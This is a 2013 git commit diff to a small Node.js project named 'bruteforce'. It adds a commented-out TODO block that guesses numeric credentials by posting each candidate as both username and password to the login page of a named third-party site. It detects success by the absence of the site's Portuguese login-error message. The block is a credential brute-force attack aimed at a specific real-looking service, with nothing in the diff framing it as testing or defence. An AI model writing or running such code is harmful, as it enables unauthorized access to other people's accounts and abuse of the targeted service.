de91e51b131c425be235397c17d4c2d39a669958
Vicente de Alencar <vicentedealencar@gmail.com>
2013-03-01 02:18:11 -0300

    interface to implement

--- bruteforce/app.js
+++ bruteforce/app.js
@@ -8,3 +8,34 @@ bruteforce(
 		}, 1000);
 	},
 	function(right) { console.log('RIGHT:', right); });
+
+//TODO
+
+// var bruteforce = require('./bruteforce');
+// var request = require('request');
+
+// bruteforce(
+// 	'0123456789',
+// 	function(possible) {
+// 		return possible.length > 12;
+// 	},
+// 	function(possible, done){
+// 		request.post(
+// 			'https://internet.hashtag.com.br/Account/Login',
+// 			{
+// 				form: {
+// 					UserName: possible,
+// 					Password: possible
+// 				}
+// 			},
+// 			function (error, response, body) {
+// 				if (!error && response.statusCode == 200) {
+// 					done(body.indexOf('Login ou senha incorretos.') == -1);
+// 				}
+// 			}
+// 		);
+// 	},
+// 	function(right) {
+// 		console.log('RIGHT:', right);
+// });
+
